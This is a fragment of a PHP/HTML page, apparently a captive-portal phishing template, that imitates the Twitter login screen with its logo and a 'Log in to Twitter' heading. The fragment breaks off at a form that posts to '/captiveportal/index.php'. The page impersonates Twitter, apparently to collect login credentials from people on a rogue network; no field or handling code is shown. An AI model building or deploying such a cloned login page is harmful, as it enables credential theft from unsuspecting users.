...
?>
  ...
  <head>
    ...
    <link rel="stylesheet" href="assets/tw_assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/tw_assets/css/style.css">
    <link rel="icon" type="image/png" href="assets/tw_assets/img/oxvhareuw0.png"/>
      ...
      <div class="account-wall">
        ...
        <div class="google-header-bar centered">
          <div class="header content clearfix">
            <img alt="Twitter" class="logo" src="assets/tw_assets\img\j35g5c9082.png">
          </div>
        </div>

        <h1 class="text-center login-title">Log in to Twitter</h1>

          <form method="POST" action="/captiveportal/index.php" class="form-signin">
